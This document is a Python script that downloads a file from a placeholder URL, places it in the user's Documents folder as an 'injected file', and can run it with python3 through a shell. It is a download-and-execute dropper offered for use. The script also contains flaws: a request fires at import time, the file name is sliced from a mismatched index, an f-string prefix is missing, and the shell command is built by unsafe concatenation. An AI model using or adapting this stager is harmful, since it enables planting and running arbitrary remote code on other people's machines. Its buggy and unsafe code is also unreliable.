import subprocess
import requests as rq
from tqdm import tqdm
from time import sleep
import os

#settings:
#download url
downloadUrl = "DOWNLOAD_LINK"
#set this to True if you want the injected file to be ran. this only works with python files
runFile = False
#ignore this stuff
chunk_size = 8192
user = os.path.expanduser('~')
req = rq.get(downloadUrl, stream = True)
filename = req.url[downloadUrl.rfind('/')+1:]

def main():
    user = os.path.expanduser('~')
    req = rq.get(downloadUrl, stream = True)
    filename = req.url[downloadUrl.rfind('/')+1:]
    injectPath = user + "\\Documents\\" + filename

    fileSize = int(req.headers['content-length'])

    with open(filename, 'wb') as f:
        for data in tqdm(iterable = req.iter_content(chunk_size=chunk_size), total= fileSize/chunk_size, unit = 'KB'):
            f.write(data)
    print('download complete')
    sleep(1)
    print('injecting to specified path...')
    if os.path.exists(injectPath):
        print('there is already a file in {injectPath}')
    else:
        os.replace(filename, injectPath)
        print("file injected")
    sleep(1)
    if runFile == True:
        print("attempting to run injected file...")
        cmd = 'python3 ' + injectPath
        p = subprocess.Popen(cmd, shell=True)
        out, err = p.communicate()
        print(err)
        print(out)
        print('ran injected script!')

if __name__ == '__main__':
    main()